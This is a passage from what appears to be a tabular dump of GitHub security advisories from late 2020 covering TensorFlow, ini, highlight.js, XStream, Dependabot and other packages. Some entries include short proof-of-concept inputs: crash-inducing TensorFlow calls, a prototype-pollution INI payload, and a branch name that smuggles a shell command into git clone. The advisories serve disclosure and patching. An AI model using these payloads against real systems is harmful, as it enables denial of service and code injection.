Under certain cases, loading a saved model can result in accessing uninitialized memory while building the computation graph. The [`MakeEdge` function](https://github.com/tensorflow/tensorflow/blob/3616708cb866365301d8e67b43b32b46d94b08a0/tensorflow/core/common_runtime/graph_constructor.cc#L1426-L1438) creates an edge between one output tensor of the `src` node (given by `output_index`) and the input slot of the `dst` node (given by `input_index`). This is only possible if the types of the tensors on both sides coincide, so the function begins by obtaining the corresponding `DataType` values and comparing these for equality:

```cc
  DataType src_out = src->output_type(output_index);
  DataType dst_in = dst->input_type(input_index);
  //...
```

However, there is no check that the indices point to inside of the arrays they index into. Thus, this can result in accessing data out of bounds of the corresponding heap allocated arrays.

In most scenarios, this can manifest as unitialized data access, but if the index points far away from the boundaries of the arrays this can be used to leak addresses from the library.

### Patches
We have patched the issue in GitHub commit [0cc38aaa4064fd9e79101994ce9872c6d91f816b](https://github.com/tensorflow/tensorflow/commit/0cc38aaa4064fd9e79101994ce9872c6d91f816b) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

Since this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
576,20741,tensorflow,GHSA-m648-33qf-v3gp,CVE-2020-26270,https://github.com/advisories/GHSA-m648-33qf-v3gp,low,2020-12-10 19:07:31 UTC,CHECK-fail in LSTM with zero-length input in TensorFlow,"### Impact
Running an LSTM/GRU model where the LSTM/GRU layer receives an input with zero-length results in a `CHECK` failure when using the CUDA backend.

This can result in a query-of-death vulnerability, via denial of service, if users can control the input to the layer.

### Patches
We have patched the issue in GitHub commit [14755416e364f17fb1870882fa778c7fec7f16e3](https://github.com/tensorflow/tensorflow/commit/14755416e364f17fb1870882fa778c7fec7f16e3) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

Since this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
577,20741,tensorflow,GHSA-hhvc-g5hv-48c6,CVE-2020-26268,https://github.com/advisories/GHSA-hhvc-g5hv-48c6,low,2020-12-10 19:07:28 UTC,Write to immutable memory region in TensorFlow,"### Impact
The `tf.raw_ops.ImmutableConst` operation returns a constant tensor created from a memory mapped file which is assumed immutable. However, if the type of the tensor is not an integral type, the operation crashes the Python interpreter as it tries to write to the memory area:

```python
>>> import tensorflow as tf
>>> with open('/tmp/test.txt','w') as f: f.write('a'*128)
>>> tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,
                              memory_region_name='/tmp/test.txt')
```

If the file is too small, TensorFlow properly returns an error as the memory area has fewer bytes than what is needed for the tensor it creates. However, as soon as there are enough bytes, the above snippet causes a segmentation fault.

This is because the alocator used to return the buffer data is not marked as returning an opaque handle since the [needed virtual method](https://github.com/tensorflow/tensorflow/blob/c1e1fc899ad5f8c725dcbb6470069890b5060bc7/tensorflow/core/framework/typed_allocator.h#L78-L85) is [not overriden](https://github.com/tensorflow/tensorflow/blob/acdf3c04fcfa767ae8d109b9e1f727ef050dba4d/tensorflow/core/kernels/immutable_constant_op.cc).

### Patches
We have patched the issue in GitHub commit [c1e1fc899ad5f8c725dcbb6470069890b5060bc7](https://github.com/tensorflow/tensorflow/commit/c1e1fc899ad5f8c725dcbb6470069890b5060bc7) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

Since this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
578,20741,tensorflow,GHSA-c9f3-9wfr-wgh7,CVE-2020-26267,https://github.com/advisories/GHSA-c9f3-9wfr-wgh7,low,2020-12-10 19:07:26 UTC,Lack of validation in data format attributes in TensorFlow,"### Impact
The `tf.raw_ops.DataFormatVecPermute` API does not validate the `src_format` and `dst_format` attributes. [The code](https://github.com/tensorflow/tensorflow/blob/304b96815324e6a73d046df10df6626d63ac12ad/tensorflow/core/kernels/data_format_ops.cc) assumes that these two arguments define a permutation of `NHWC`.

However, these assumptions are not checked and this can result in uninitialized memory accesses, read outside of bounds and even crashes.

```python
>>> import tensorflow as tf
>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='1234', dst_format='1234')
<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='HHHH', dst_format='WWWW')
<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='H', dst_format='W')
<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)>
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], 
                                    src_format='1234', dst_format='1253')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],
                                    src_format='1234', dst_format='1223')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],
                                    src_format='1224', dst_format='1423')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format='1234', dst_format='432')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],
                                    src_format='12345678', dst_format='87654321')
munmap_chunk(): invalid pointer
Aborted
...
>>> tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],           
                                    src_format='12345678', dst_format='87654321')
<tf.Tensor: shape=(4, 2), dtype=int32, numpy=
array([[71364624,        0],
       [71365824,        0],
       [     560,        0],
       [      48,        0]], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]], 
                                    src_format='12345678', dst_format='87654321')
free(): invalid next size (fast)
Aborted
```

A similar issue occurs in `tf.raw_ops.DataFormatDimMap`, for the same reasons:

```python
>>> tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format='1234',
>>> dst_format='8765')
<tf.Tensor: shape=(4, 2), dtype=int32, numpy=
array([[1954047348, 1954047348],
       [1852793646, 1852793646],
       [1954047348, 1954047348],
       [1852793632, 1852793632]], dtype=int32)>
```

### Patches
We have patched the issue in GitHub commit [ebc70b7a592420d3d2f359e4b1694c236b82c7ae](https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

Since this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
579,20741,tensorflow,GHSA-qhxx-j73r-qpm2,CVE-2020-26266,https://github.com/advisories/GHSA-qhxx-j73r-qpm2,low,2020-12-10 19:07:24 UTC,Uninitialized memory access in TensorFlow,"### Impact
Under certain cases, a saved model can trigger use of uninitialized values during code execution. This is caused by having tensor buffers be filled with the default value of the type but forgetting to [default initialize the quantized floating point types in Eigen](https://github.com/tensorflow/tensorflow/blob/f70160322a579144950dff1537dcbe3c7c09d6f5/third_party/eigen3/unsupported/Eigen/CXX11/src/FixedPoint/FixedPointTypes.h#L61-L104):

```cc
struct QUInt8 {
  QUInt8() {}
  // ...
  uint8_t value;
};

struct QInt16 {
  QInt16() {}
  // ...
  int16_t value;
};

struct QUInt16 {
  QUInt16() {}
  // ...
  uint16_t value;
};

struct QInt32 {
  QInt32() {}
  // ...
  int32_t value;
};
```

### Patches
We have patched the issue in GitHub commit [ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2](https://github.com/tensorflow/tensorflow/commit/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

Since this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
580,16594,ini,GHSA-qqgx-2p2h-9c37,CVE-2020-7788,https://github.com/advisories/GHSA-qqgx-2p2h-9c37,high,2020-12-10 16:53:45 UTC,ini before 1.3.6 vulnerable to Prototype Pollution via ini.parse,"### Overview
The `ini` npm package before version 1.3.6 has a Prototype Pollution vulnerability.

If an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.

### Patches

This has been patched in 1.3.6

### Steps to reproduce

payload.ini
```
[__proto__]
polluted = ""polluted""
```

poc.js:
```
var fs = require('fs')
var ini = require('ini')

var parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))
console.log(parsed)
console.log(parsed.__proto__)
console.log(polluted)
```

```
> node poc.js
{}
{ polluted: 'polluted' }
{ polluted: 'polluted' }
polluted
```",npm
581,34002,org.codehaus.groovy:groovy,GHSA-rcjj-h6gh-jf3r,CVE-2020-17521,https://github.com/advisories/GHSA-rcjj-h6gh-jf3r,moderate,2020-12-09 19:03:03 UTC,Information Disclosure in Apache Groovy,"Apache Groovy provides extension methods to aid with creating temporary directories. Prior to this fix, Groovy's implementation of those extension methods was using a now superseded Java JDK method call that is potentially not secure on some operating systems in some contexts. Users not using the extension methods mentioned in the advisory are not affected, but may wish to read the advisory for further details. Versions Affected: 2.0 to 2.4.20, 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1. Fixed in versions 2.4.21, 2.5.14, 3.0.7, 4.0.0-alpha-2.",maven
582,18136,fast-csv,GHSA-8cv5-p934-3hwp,CVE-2020-26256,https://github.com/advisories/GHSA-8cv5-p934-3hwp,low,2020-12-08 21:42:53 UTC,Denial of service in fast-csv,"### Impact
Possible ReDoS (Regular Expression Denial of Service) when using `ignoreEmpty` option when parsing.

### Patches
This has been patched in `v4.3.6`

### Workarounds
You will only be affected by this if you use the `ignoreEmpty` parsing option. If you do use this option it is recommended that you upgrade to the latest version `v4.3.6`

### References

This vulnerability was found using a [CodeQL](https://securitylab.github.com/tools/codeql) query which identified `EMPTY_ROW_REGEXP` regular expression as vulnerable.
[Link to query run](https://lgtm.com/query/8609731774537641779/). 

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [fast-csv](https://github.com/C2FO/fast-csv)",npm
583,16137,highlight.js,GHSA-7wwv-vh3v-89cq,,https://github.com/advisories/GHSA-7wwv-vh3v-89cq,moderate,2020-12-04 16:47:20 UTC,ReDOS vulnerabities: multiple grammars,"### Impact: Potential ReDOS vulnerabilities (exponential and polynomial RegEx backtracking)

[oswasp](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS): 

> The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.

If are you are using Highlight.js to highlight user-provided data you are possibly vulnerable.  On the client-side (in a browser or Electron environment) risks could include lengthy freezes or crashes... On the server-side infinite freezes could occur... effectively preventing users from accessing your app or service (ie, Denial of Service).

This is an issue with grammars shipped with the parser (and potentially 3rd party grammars also), not the parser itself. If you are using Highlight.js with any of the following grammars you are vulnerable.  If you are using `highlightAuto` to detect the language (and have any of these grammars registered) you are vulnerable. Exponential grammars (C, Perl, JavaScript) are auto-registered when using the common grammar subset/library `require('highlight.js/lib/common')` as of 10.4.0 - see https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.4.0/build/highlight.js

All versions prior to 10.4.1 are vulnerable, including version 9.18.5. 

**Grammars with exponential backtracking issues:**

  - c-like (c, cpp, arduino)
  - handlebars (htmlbars)
  - gams
  - perl
  - jboss-cli
  - r
  - erlang-repl
  - powershell
  - routeros
  - livescript (10.4.0 and 9.18.5 included this fix)
  - javascript & typescript (10.4.0 included partial fixes)

And of course any aliases of those languages have the same issue. ie: `hpp` is no safer than `cpp`.

**Grammars with polynomial backtracking issues:**

- kotlin
- gcode
- d
- aspectj
- moonscript
- coffeescript/livescript
- csharp
- scilab
- crystal
- elixir
- basic
- ebnf
- ruby
- fortran/irpf90
- livecodeserver
- yaml
- x86asm
- dsconfig
- markdown
- ruleslanguage
- xquery
- sqf

And again: any aliases of those languages have the same issue. ie: `ruby` and `rb` share the same ruby issues.


### Patches

- Version 10.4.1 resolves these vulnerabilities.  Please upgrade.

### Workarounds / Mitigations

- Discontinue use the affected grammars. (or perhaps use only those with poly vs exponential issues)
- Attempt cherry-picking the grammar fixes into older versions...
- Attempt using newer CDN versions of any affected languages.  (ie using an older CDN version of the library with newer CDN grammars).  Your mileage may vary.

### References

- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

### For more information

If you have any questions or comments about this advisory:
* Open an issue: https://github.com/highlightjs/highlight.js/issues
* Email us at [security@highlightjs.com](mailto:security@highlightjs.com)",npm
584,29027,oic,GHSA-4fjv-pmhg-3rfg,CVE-2020-26244,https://github.com/advisories/GHSA-4fjv-pmhg-3rfg,moderate,2020-12-04 16:47:12 UTC,Multiple cryptographic issues in Python oic,"### Impact
* Client implementations using this library

### Issues
1) The IdToken signature algorithm was not checked automatically, but only if the expected algorithm was passed in as a kwarg.
2) JWA `none` algorithm was allowed in all flows.
3) `oic.consumer.Consumer.parse_authz` returns an unverified IdToken. The verification of the token was left to the discretion of the implementator.
4) `iat` claim was not checked for sanity (i.e. it could be in the future)

### Patches
1) IdToken signature is now always checked.
2) JWA `none` algorithm is now allowed only if using the `response_type` `code`
3) IdToken verification is now done automatically.
4) `iat` claim is now checked for sanity.",pip
585,14817,CefSharp.Common,GHSA-m7mf-48hp-5qmr,CVE-2020-16009,https://github.com/advisories/GHSA-m7mf-48hp-5qmr,high,2020-12-02 18:28:47 UTC,Inappropriate implementation in V8,"CVE-2020-16009: Inappropriate implementation in V8

- https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16009

Google is aware of reports that exploits for CVE-2020-16009 exist in the wild.

Allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.

There is currently little to no public information on the issue other than it has been flagged as `High` severity.",nuget
586,30143,petl,GHSA-f5gc-p5m3-v347,,https://github.com/advisories/GHSA-f5gc-p5m3-v347,low,2020-12-02 18:28:30 UTC,XXE in petl,"### Impact
Information Disclosure

### Summary

[petl](https://github.com/petl-developers/petl) is a Python library that provides functions for extraction, transformation, and loading (ETL) of data.

petl before 1.68, in some configurations, allows resolution of entities in XML input.

An attacker who is able to submit XML input to an application using petl can disclose arbitrary files on the file system in the context of the user under which the application is running.

### Affected Applications

Applications that:

- accept attacker-supplied XML input that is processed using petl < 1.68
- return the response generated by petl back to the attacker
- configure lxml as the underlying XML processing library used by petl
- have read privileges in filesystem files with sensitive information

### Mitigation
Update to petl >= 1.68

### Workarounds

- Assure there is no user/external access to the application using [petl](https://github.com/petl-developers/petl)
- Assure your application is not using the function [fromxml()](https://petl.readthedocs.io/en/stable/io.html#petl.io.xml.fromxml)

### References
- https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md
- https://github.com/petl-developers/petl/pull/527
- https://github.com/petl-developers/petl/releases/tag/v1.6.8
- https://petl.readthedocs.io/en/stable/changes.html
- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

### For more information
If you have any questions or comments about this advisory:
* Add a comment in the Github [issue](https://github.com/petl-developers/petl/pull/527)

Thaks to Naveen Sunkavally.",pip
587,33935,org.eclipse.jetty:jetty-server,GHSA-86wm-rrjm-8wh8,CVE-2020-27218,https://github.com/advisories/GHSA-86wm-rrjm-8wh8,moderate,2020-12-02 18:28:18 UTC,Buffer not correctly recycled in Gzip Request inflation,"### Impact
If GZIP request body inflation is enabled and requests from different clients are multiplexed onto a single connection and if an 
attacker can send a request with a body that is received entirely by not consumed by the application, then a subsequent request
on the same connection will see that body prepended to it's body.

The attacker will not see any data, but may inject data into the body of the subsequent request

CVE score is [4.8 AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L&version=3.1)

### Workarounds
The problem can be worked around by either:
- Disabling compressed request body inflation by GzipHandler.
- By always fully consuming the request content before sending a response.
- By adding a `Connection: close` to any response where the servlet does not fully consume request content.",maven
588,14817,CefSharp.Common,GHSA-x7fx-mcc9-27j7,CVE-2020-16013,https://github.com/advisories/GHSA-x7fx-mcc9-27j7,high,2020-11-27 20:12:55 UTC,Inappropriate implementation in V8 in CefSharp,"High CVE-2020-16013: Inappropriate implementation in V8. 

- https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop_11.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16013

Google is aware of reports that exploits for CVE-2020-16013 and CVE-2020-16017 exist in the wild.

There is currently little to no public information on the issue other than it has been flagged as `High` severity.",nuget
589,14817,CefSharp.Common,GHSA-gvqv-779r-4jgp,CVE-2020-16017,https://github.com/advisories/GHSA-gvqv-779r-4jgp,high,2020-11-27 20:13:05 UTC,Use after free in CefSharp,"CVE-2020-16017: Use after free in site isolation

- https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop_11.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16017

Google is aware of reports that exploits for CVE-2020-16013 and CVE-2020-16017 exist in the wild.

There is currently little to no public information on the issue other than it has been flagged as `High` severity.",nuget
590,37646,com.cronutils:cron-utils,GHSA-pfj3-56hm-jwq5,CVE-2020-26238,https://github.com/advisories/GHSA-pfj3-56hm-jwq5,critical,2020-11-24 23:48:38 UTC,Template injection in cron-utils,"### Impact
A Template Injection was identified in cron-utils enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. Versions up to 9.1.2 are susceptible to this vulnerability. Please note, that only projects using the @Cron annotation to validate untrusted Cron expressions are affected.

### Patches
The issue was patched and a new version released. Please upgrade to version 9.1.3.

### Workarounds
There are no known workarounds up to this moment.

### References
A description of the issue is provided in [issue 461](https://github.com/jmrozanec/cron-utils/issues/461)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [cron-utils Github repository](https://github.com/jmrozanec/cron-utils)",maven
591,16137,highlight.js,GHSA-vfrc-7r7c-w9mx,CVE-2020-26237,https://github.com/advisories/GHSA-vfrc-7r7c-w9mx,moderate,2020-11-24 22:58:41 UTC,Prototype Pollution in highlight.js,"### Impact

Affected versions of this package are vulnerable to Prototype Pollution.  A malicious HTML code block can be crafted that will result in prototype pollution of the base object's prototype during highlighting.  If you allow users to insert custom HTML code blocks into your page/app via parsing Markdown code blocks (or similar) and do not filter the language names the user can provide you may be vulnerable. 

The pollution should just be harmless data but this can cause problems for applications not expecting these properties to exist and can result in strange behavior or application crashes, i.e. a potential DOS vector. 

_If your website or application does not render user provided data it should be unaffected._

### Patches

Versions 9.18.2 and 10.1.2 and newer include fixes for this vulnerability.  If you are using version 7 or 8 you are encouraged to upgrade to a newer release.

### Workarounds

#### Patch your library

Manually patch your library to create null objects for both `languages` and `aliases`:

```js
const HLJS = function(hljs) {
  // ...
  var languages = Object.create(null);
  var aliases = Object.create(null);
```

#### Filter out bad data from end users:

Filter the language names that users are allowed to inject into your HTML to guarantee they are valid.

### References

* [What is Prototype Pollution?](https://codeburst.io/what-is-prototype-pollution-49482fc4b638)
* https://github.com/highlightjs/highlight.js/pull/2636

### For more information

If you have any questions or comments about this advisory:

* Please file an issue against [highlight.js](https://github.com/highlightjs/highlight.js/issues/)",npm
592,30675,jupyter-server,GHSA-grfj-wjv9-4f9v,CVE-2020-26232,https://github.com/advisories/GHSA-grfj-wjv9-4f9v,moderate,2020-11-24 21:20:52 UTC,Open redirect in Jupyter Server,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Open redirect vulnerability - a maliciously crafted link to a jupyter server could redirect the browser to a different website.

All jupyter servers are technically affected, however, these maliciously crafted links can only be reasonably made for known jupyter server hosts. A link to your jupyter server may *appear* safe, but ultimately redirect to a spoofed server on the public internet.

This originated in jupyter/notebook: https://github.com/jupyter/notebook/security/advisories/GHSA-c7vm-f5p4-8fqh

### Patches

_Has the problem been patched? What versions should users upgrade to?_

jupyter_server 1.0.6

### References

[OWASP page on open redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list [security@ipython.org](mailto:security@ipython.org).

Credit: zhuonan li of Alibaba Application Security Team",pip
593,15935,semantic-release,GHSA-r2j6-p67h-q639,CVE-2020-26226,https://github.com/advisories/GHSA-r2j6-p67h-q639,high,2020-11-18 21:19:14 UTC,Secret disclosure when containing characters that become URI encoded,"### Impact

Secrets that would normally be masked by `semantic-release` can be accidentally disclosed if they contain characters that become encoded when included in a URL.

### Patches

Fixed in v17.2.3

### Workarounds

Secrets that do not contain characters that become encoded when included in a URL are already masked properly.",npm
594,20024,notebook,GHSA-c7vm-f5p4-8fqh,CVE-2020-26215,https://github.com/advisories/GHSA-c7vm-f5p4-8fqh,moderate,2020-11-18 21:06:36 UTC,Open redirect in Jupyter Notebook,"[localhost](http://localhost:8888)

### Impact
_What kind of vulnerability is it? Who is impacted?_

Open redirect vulnerability - a maliciously crafted link to a notebook server could redirect the browser to a different website.

All notebook servers are technically affected, however, these maliciously crafted links can only be reasonably made for known notebook server hosts. A link to your notebook server may *appear* safe, but ultimately redirect to a spoofed server on the public internet.

### Patches

_Has the problem been patched? What versions should users upgrade to?_

Patched in notebook 6.1.5


### References

[OWASP page on open redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list [security@ipython.org](mailto:security@ipython.org).

Credit: zhuonan li of Alibaba Application Security Team",pip
595,34016,com.thoughtworks.xstream:xstream,GHSA-mw36-7c6c-q4q2,CVE-2020-26217,https://github.com/advisories/GHSA-mw36-7c6c-q4q2,high,2020-11-16 20:07:59 UTC,XStream can be used for Remote Code Execution,"### Impact
The vulnerability may allow a remote attacker to run arbitrary shell commands only by manipulating the processed input stream.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.14.

### Workarounds
No user is affected, who followed the recommendation to setup XStream's Security Framework with a whitelist! Anyone relying on XStream's default blacklist can immediately switch to a whilelist for the allowed types to avoid the vulnerability.

Users of XStream 1.4.13 or below who still want to use XStream default blacklist can use a workaround depending on their version in use.

Users of XStream 1.4.13 can simply add two lines to XStream's setup code:
```Java
xstream.denyTypes(new String[]{ ""javax.imageio.ImageIO$ContainsFilter"" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });
```
Users of XStream 1.4.12 to 1.4.7 who want to use XStream with a black list will have to setup such a list from scratch and deny at least the following types: _javax.imageio.ImageIO$ContainsFilter_, _java.beans.EventHandler_, _java.lang.ProcessBuilder_, _java.lang.Void_ and _void_.
```Java
xstream.denyTypes(new String[]{ ""javax.imageio.ImageIO$ContainsFilter"" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });
```
Users of XStream 1.4.6 or below can register an own converter to prevent the unmarshalling of the currently know critical types of the Java runtime. It is in fact an updated version of the workaround for CVE-2013-7285:
```Java
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null && (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class || type.getName().equals(""javax.imageio.ImageIO$ContainsFilter"") || Proxy.isProxy(type));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException(""Unsupported type due to security reasons."");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException(""Unsupported type due to security reasons."");
  }
}, XStream.PRIORITY_LOW);
```

### Credits
Chen L found and reported the issue to XStream and provided the required information to reproduce it.  He was supported by Zhihong Tian and Hui Lu, both from Guangzhou University.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2020-26217](https://x-stream.github.io/CVE-2020-26217.html).

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
596,27619,spree_api,GHSA-m2jr-hmc3-qmpr,CVE-2020-26223,https://github.com/advisories/GHSA-m2jr-hmc3-qmpr,high,2020-11-13 17:18:22 UTC,Authorization bypass in Spree,"### Impact
The perpetrator could query the [API v2 Order Status](https://guides.spreecommerce.org/api/v2/storefront#tag/Order-Status) endpoint with an empty string passed as an Order token

### Patches
Please upgrade to 3.7.11, 4.0.4, or 4.1.11 depending on your used Spree version. Users of Spree < 3.7 are not affected.

### References
Pull request with a fix and in-depth explanation - https://github.com/spree/spree/pull/10573

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@spreecommerce.org](mailto:security@spreecommerce.org)",rubygems
597,20741,tensorflow,GHSA-xwhf-g6j5-j5gc,CVE-2020-15266,https://github.com/advisories/GHSA-xwhf-g6j5-j5gc,low,2020-11-13 17:18:29 UTC,Float cast overflow undefined behavior,"### Impact
When the `boxes` argument of `tf.image.crop_and_resize` has a very large value, the CPU kernel implementation receives it as a C++ `nan` floating point value. Attempting to operate on this is undefined behavior which later produces a segmentation fault.

### Patches

We have patched the issue in c0319231333f0f16e1cc75ec83660b01fedd4182 and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported in #42129",pip
598,20741,tensorflow,GHSA-rrfp-j2mp-hq9c,CVE-2020-15265,https://github.com/advisories/GHSA-rrfp-j2mp-hq9c,low,2020-11-13 17:13:04 UTC,Segfault in `tf.quantization.quantize_and_dequantize`,"### Impact
An attacker can pass an invalid `axis` value to `tf.quantization.quantize_and_dequantize`:

```python
tf.quantization.quantize_and_dequantize(
    input=[2.5, 2.5], input_min=[0,0], input_max=[1,1], axis=10)
```

This results in accessing [a dimension outside the rank of the input tensor](https://github.com/tensorflow/tensorflow/blob/0225022b725993bfc19b87a02a2faaad9a53bc17/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74) in the C++ kernel implementation:
```
const int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);
```

However, [`dim_size` only does a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/0225022b725993bfc19b87a02a2faaad9a53bc17/tensorflow/core/framework/tensor_shape.cc#L292-L307) to validate the argument and then uses it to access the corresponding element of an array:
```
int64 TensorShapeBase<Shape>::dim_size(int d) const {
  DCHECK_GE(d, 0);
  DCHECK_LT(d, dims());
  DoStuffWith(dims_[d]);
}
```

Since in normal builds, `DCHECK`-like macros are no-ops, this results in segfault and access out of bounds of the array.

### Patches

We have patched the issue in eccb7ec454e6617738554a255d77f08e60ee0808 and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported in #42105",pip
599,27646,dependabot-common,GHSA-23f7-99jx-m54r,CVE-2020-26222,https://github.com/advisories/GHSA-23f7-99jx-m54r,low,2020-11-13 15:47:50 UTC,Remote code execution in dependabot-core branch names when cloning,"### Impact
Remote code execution vulnerability in `dependabot-common` and  `dependabot-go_modules` when a source branch name contains malicious injectable bash code.

For example, if Dependabot is configured to use the following source branch name: `""/$({curl,127.0.0.1})""`, Dependabot will make a HTTP request to the following URL: 127.0.0.1 when cloning the source repository.

When Dependabot is configured to clone the source repository during an update, Dependabot runs a shell command to git clone the repository:

```bash
git clone --no-tags --no-recurse-submodules --depth=1 --branch=<BRANCH> --single-branch <GITHUB_REPO_URL> repo/contents/path
```

Dependabot will always clone the source repository for `go_modules` during the file fetching step and can be configured to clone the repository for other package managers using the `FileFetcher` class from `dependabot-common`.

```ruby
source = Dependabot::Source.new(
  provider: ""github"",
  repo: ""repo/name"",
  directory: ""/"",
  branch: ""/$({curl,127.0.0.1})"",
)

repo_contents_path = ""./file/path""
fetcher = Dependabot::FileFetchers.for_package_manager(""bundler"").
                  new(source: source, credentials: [],
                  repo_contents_path: repo_contents_path)
fetcher.clone_repo_contents
```

### Patches

The fix was applied to version `0.125.1`: https://github.com/dependabot/dependabot-core/pull/2727

